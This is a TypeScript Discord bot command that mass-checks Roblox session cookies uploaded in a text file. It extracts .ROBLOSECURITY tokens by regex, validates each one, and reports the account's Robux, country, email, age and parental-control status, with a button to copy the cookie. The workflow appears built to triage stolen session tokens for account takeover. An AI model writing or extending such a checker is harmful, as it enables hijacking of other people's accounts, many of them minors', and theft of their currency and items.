import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  type ChatInputCommandInteraction,
  MessageFlags,
} from 'discord.js';
import * as Roblox from '../../lib/roblox-api';
import { buildSuccessEmbed, buildErrorEmbed, buildInvalidCookieEmbed, buildIpLimitEmbed, buildTimeoutEmbed, buildProgressEmbed, buildAccountEmbed } from '../../lib/embed-helpers';
import { buildCopyButtons } from '../../lib/button-helpers';
import { EMOJIS } from '../../lib/emoji';
import { logger } from '../../lib/logger';
import type { Command } from './types';

const store = new Map<string, string>();

const FULL_COOKIE_RE = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/g;
const BARE_COOKIE_RE = /CAEQ[A-Za-z0-9._\-+=\/]{50,}/g;

function extractCookies(text: string): string[] {
  const fullMatches = [...text.matchAll(FULL_COOKIE_RE)].map((m) => m[0]);
  const fullBareValues = new Set(fullMatches.map((m) => m.slice(m.indexOf('|_CAEQ') + 2)));
  const bareMatches = [...text.matchAll(BARE_COOKIE_RE)]
    .map((m) => m[0])
    .filter((v) => !fullBareValues.has(v));
  const seen = new Set<string>();
  const result: string[] = [];
  for (const full of fullMatches) {
    const bare = full.slice(full.indexOf('|_CAEQ') + 2);
    if (!seen.has(bare)) { seen.add(bare); result.push(full); }
  }
  for (const bare of bareMatches) {
    if (!seen.has(bare)) { seen.add(bare); result.push(bare); }
  }
  return result;
}

const data = new SlashCommandBuilder()
  .setName('check')
  .setDescription('Mass Checking File')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addAttachmentOption((opt) =>
    opt.setName('file')
      .setDescription('A .txt file containing cookies')
      .setRequired(true),
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const attachment = interaction.options.getAttachment('file', true);
    if (!attachment.name?.endsWith('.txt') && !attachment.contentType?.includes('text')) {
      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Invalid File**\n────\n⭑ Please attach a `.txt` file.')] });
      return;
    }

    let fileContent: string;
    try {
      const resp = await fetch(attachment.url);
      fileContent = await resp.text();
    } catch {
      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Download Failed**\n────\n⭑ Could not fetch the file.')] });
      return;
    }

    const cookies = extractCookies(fileContent);
    if (cookies.length === 0) {
      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **No Cookies Found**\n────\n⭑ File must contain `_|WARNING...|_CAEQ…` or bare `CAEQ…` tokens.')] });
      return;
    }

    const progressEmbed = buildProgressEmbed(`Scanning ${cookies.length} cookie(s)...`);
    await interaction.editReply({ embeds: [progressEmbed] });

    let validCount = 0;
    let totalRobux = 0;

    for (const rawCookie of cookies) {
      const validation = await Roblox.validateCookie(rawCookie);
      if (!validation.valid) continue;

      validCount++;
      const age = await Roblox.getUserAge(validation.userId!);
      const robux = await Roblox.fetchRobux(rawCookie, String(validation.userId!));
      const country = await Roblox.fetchCountry(rawCookie);
      const email = await Roblox.fetchEmailInfo(rawCookie);
      const parental = await Roblox.fetchParentalControls(rawCookie);
      totalRobux += robux;

      let emailStatus = 'No email';
      if (email.verified) emailStatus = `${EMOJIS.VERIFICATION} Verified`;
      else if (email.pending) emailStatus = '⏳ Pending';

      const id = Math.random().toString(36).slice(2, 10);
      store.set(id, rawCookie);
      setTimeout(() => store.delete(id), 300000);

      const row = buildCopyButtons(id, 'check');
      const embed = buildAccountEmbed(
        validation.username!,
        validation.displayName || null,
        validation.userId!,
        age,
        robux,
        country,
        emailStatus,
        parental.hasParent ? `${EMOJIS.VERIFICATION} Linked` : '❌ None'
      );
      await interaction.followUp({ embeds: [embed], components: [row], flags: MessageFlags.Ephemeral });
    }

    const summaryEmbed = buildSuccessEmbed(
      validCount === 0
        ? `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** 0\n⭑ All are invalid or expired.`
        : `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** ${validCount}\n⭑ **Total Robux:** ${totalRobux.toLocaleString()}`
    );
    await interaction.followUp({ embeds: [summaryEmbed], flags: MessageFlags.Ephemeral });
  } catch (err: any) {
    logger.error({ err }, 'Check command error');
    await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')] });
  }
}

export const checkCommand: Command = { data, execute };